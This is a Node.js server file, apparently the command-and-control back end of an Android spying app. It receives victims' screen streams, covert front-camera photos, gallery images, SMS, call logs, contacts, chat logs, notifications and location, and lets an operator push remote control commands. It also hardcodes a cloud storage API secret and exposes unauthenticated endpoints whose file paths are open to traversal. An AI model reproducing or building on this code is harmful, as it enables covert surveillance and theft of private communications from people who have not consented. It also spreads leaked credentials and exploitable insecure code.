const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser');
const cloudinary = require('cloudinary').v2;
const http = require('http'); 
const { Server } = require("socket.io");
const compression = require('compression'); // ✅ NEW: Fast Data Transfer

const app = express();
const server = http.createServer(app);
const PORT = process.env.PORT || 3000;

// ✅ 1. OPTIMIZED SOCKET.IO SETUP (Fast & Stable)
const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    },
    maxHttpBufferSize: 1e8, // 100MB for heavy data
    pingTimeout: 60000,     // Connection stable rakhne ke liye
    pingInterval: 25000,    // Har 25 sec me check karega
    transports: ['websocket', 'polling'] // Force Websocket for speed
});

// --- CLOUDINARY CONFIG ---
cloudinary.config({
    cloud_name: 'dxnh5vuik',
    api_key: '185953318184881',
    api_secret: 'CRKdBl2m68VLYV1rFnHz51XiL8Q'
});

// --- SETUP & MIDDLEWARE ---
const UPLOADS_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR);

app.use(compression()); // ✅ Gzip Compression (Makes responses 70% smaller/faster)
app.use(cors({ origin: '*' }));
app.use(bodyParser.json({ limit: '100mb' }));
app.use(bodyParser.urlencoded({ limit: '100mb', extended: true }));
app.use(express.static(__dirname));

// Live Status (RAM Storage)
let devicesStatus = {}; 

// --- 2. FAST SOCKET LOGIC ---
io.on('connection', (socket) => {
    // console.log('🔌 New Connection:', socket.id);

    socket.on('join', (roomID) => {
        socket.join(roomID);
        // console.log(`🔗 Joined: ${roomID}`);
    });

    // Device -> Admin (Screen Share)
    socket.on('screen-data', (data) => {
        socket.volatile.to(data.room).emit('screen-data', data.image);
    });

    // Admin -> Device (Control)
    socket.on('control-event', (data) => {
        socket.to(data.room).emit('control-event', data);
    });

    socket.on('disconnect', () => {
        // console.log('❌ Disconnected:', socket.id);
    });
});

app.get('/', (req, res) => {
    res.send('✅ Fast Server is Running!');
});

// ==================================================
//  ✅ INTELLIGENT UPLOAD SYSTEM (UPDATED FOR TYPE)
// ==================================================

app.post('/api/upload-image', (req, res) => {
    // Android se teeno cheezein aayengi
    let { device_id, image_data, type } = req.body; 
    
    if (!device_id || !image_data) return res.status(400).json({ error: "No Data" });

    const id = device_id.toString().trim().toUpperCase();
    
    // 🔥 LOGIC: Folder Selection
    // Agar type "front_camera" hai to folder banega: DEVICE_ID/front_camera
    // Agar type null hai (Gallery), to folder banega: DEVICE_ID
    let folderPath = id;
    
    if (type && type !== "null" && type !== "") {
        folderPath = `${id}/${type}`; // Sub-folder for Spy/Screen
    }

    // Base64 fix
    let base64Image = image_data.startsWith('data:image') ? image_data : "data:image/jpeg;base64," + image_data;

    // Cloudinary Upload
    cloudinary.uploader.upload(base64Image, 
        { 
            folder: folderPath, // ✅ Dynamic Folder Name here
            public_id: Date.now().toString(), 
            resource_type: "image", 
            width: 1280, 
            quality: "auto", 
            fetch_format: "auto" 
        }, 
        (error, result) => {
            if (error) {
                console.log("Cloudinary Error:", error);
                return res.status(500).json({ error: "Upload Failed" });
            }
            
            // Socket se Admin ko bata do
            io.emit('new-file', { device_id: id, url: result.secure_url, type: type || 'gallery' });
            
            res.json({ status: "success", url: result.secure_url });
        }
    );
});

app.get('/api/gallery-list/:device_id', (req, res) => {
    const id = req.params.device_id.toUpperCase();
    const next_cursor = req.query.next_cursor || null;

    // By default ye root folder (Gallery) dikhayega
    // Agar future me sub-folders dikhane hain to prefix change kar sakte ho
    cloudinary.api.resources({
        type: 'upload', prefix: id + "/", max_results: 20, next_cursor: next_cursor, direction: 'desc', context: true
    }, 
    (error, result) => {
        if (error) return res.json({ photos: [], next_cursor: null });
        const photos = result.resources.map(img => img.secure_url);
        res.json({ photos: photos, next_cursor: result.next_cursor });
    });
});

// ==================================================
//  ADMIN DASHBOARD & STATUS
// ==================================================

app.get('/api/admin/all-devices', (req, res) => {
    res.json(devicesStatus);
});

app.get('/api/device-status/:id', (req, res) => {
    const id = req.params.id.toUpperCase().trim();
    const device = devicesStatus[id];
    if (!device) return res.json({ id: id, isOnline: false });
    const isOnline = (Date.now() - device.lastSeen) < 60000;
    res.json({ ...device, isOnline: isOnline });
});

app.post('/api/status', (req, res) => {
    try {
        let { device_id, model, battery, level, version, charging, lat, lon } = req.body;
        if (!device_id) return res.status(400).json({ error: "No ID" });

        const id = device_id.toString().trim().toUpperCase();
        let pendingCommand = "none";
        
        if (devicesStatus[id] && devicesStatus[id].command) {
            pendingCommand = devicesStatus[id].command;
            devicesStatus[id].command = "none"; 
        }

        devicesStatus[id] = {
            ...devicesStatus[id], 
            id: id,
            model: model || (devicesStatus[id]?.model || "Unknown"),
            battery: battery || level || 0,
            version: version || "--",
            charging: (String(charging) === "true"),
            lat: lat || (devicesStatus[id]?.lat || 0),
            lon: lon || (devicesStatus[id]?.lon || 0),
            lastSeen: Date.now(),
            command: devicesStatus[id]?.command || "none" 
        };

        res.json({ status: "success", command: pendingCommand });
    } catch (e) {
        res.status(500).json({ error: "Server Error" });
    }
});

app.post('/api/send-command', (req, res) => {
    let { device_id, command } = req.body;
    if (!device_id || !command) return res.status(400).json({ error: "Missing Info" });
    const id = device_id.toUpperCase().trim();
    
    if (!devicesStatus[id]) devicesStatus[id] = { id: id, lastSeen: 0 };
    devicesStatus[id].command = command;
    
    io.to(id).emit('command', command);
    
    res.json({ status: "success", command: command });
});

// ==================================================
//  🔥 FAST ASYNC DATA STORAGE (Non-Blocking)
// ==================================================

app.post('/api/upload_data', async (req, res) => { 
    let { device_id, type, data } = req.body;
    if (!device_id) return res.status(400).json({ error: "No ID" });
    
    const id = device_id.toString().trim().toUpperCase();
    const filePath = path.join(UPLOADS_DIR, `${id}_${type}.json`);

    try {
        let parsedData = typeof data === 'string' ? JSON.parse(data) : data;

        // Update Location
        if (type === 'location') {
            const locObj = Array.isArray(parsedData) ? parsedData[parsedData.length - 1] : parsedData;
            if (locObj && (locObj.lat || locObj.latitude)) {
                if (!devicesStatus[id]) devicesStatus[id] = { id: id };
                devicesStatus[id].lat = locObj.lat || locObj.latitude;
                devicesStatus[id].lon = locObj.lon || locObj.longitude || locObj.lng;
            }
        }

        // Logic for Appending Data
        let finalData = parsedData;

        if (['notifications', 'sms', 'call_logs', 'contacts', 'chat_logs'].includes(type)) {
            let existingData = [];
            
            try {
                const fileContent = await fs.promises.readFile(filePath, 'utf8');
                existingData = JSON.parse(fileContent);
            } catch (e) { /* File nahi mili to koi baat nahi */ }

            let newDataArray = Array.isArray(parsedData) ? parsedData : [parsedData];
            
            if (type === 'chat_logs') {
                newDataArray = newDataArray.map(msg => ({ ...msg, timestamp: msg.timestamp || Date.now() }));
                finalData = [...existingData, ...newDataArray]; 
                if (finalData.length > 5000) finalData = finalData.slice(finalData.length - 5000);
            } else {
                finalData = [...newDataArray, ...existingData].slice(0, 2000); 
            }
        }

        await fs.promises.writeFile(filePath, JSON.stringify(finalData, null, 2));
        
        res.json({ status: "success" });
    } catch (error) {
        console.error("Data Write Error:", error);
        res.status(500).json({ status: "error" });
    }
});

app.get('/api/get-data/:device_id/:type', async (req, res) => {
    const filePath = path.join(UPLOADS_DIR, `${req.params.device_id.toUpperCase()}_${req.params.type}.json`);
    try {
        if (fs.existsSync(filePath)) {
            const readStream = fs.createReadStream(filePath);
            readStream.pipe(res);
        } else {
            res.json([]);
        }
    } catch (e) {
        res.json([]);
    }
});

server.listen(PORT, () => console.log(`🚀 ROCKET SERVER RUNNING ON PORT ${PORT}`));
